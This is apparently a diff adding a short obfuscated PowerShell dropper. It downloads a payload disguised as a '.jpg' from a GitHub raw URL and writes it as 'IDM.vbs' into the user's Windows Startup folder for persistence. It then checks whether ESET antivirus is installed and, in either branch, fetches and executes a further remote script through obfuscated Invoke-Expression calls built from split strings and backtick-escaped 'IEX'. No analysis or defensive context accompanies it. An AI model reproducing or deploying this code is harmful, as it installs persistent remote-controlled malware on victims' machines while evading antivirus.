@@ -1,0 +1,12 @@
+Function hhhhhcccst
+{
+(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hisin3/st/main/0.jpg', 'C:\Users\' + $env:UserName + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\IDM.vbs')
+start-sleep -s 7
+if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
+$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/hisin3/st/main/1.jpg'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
+}
+else{
+$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/hisin3/st/main/2.jpg'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X
+}
+}
+IEX hhhhhcccst
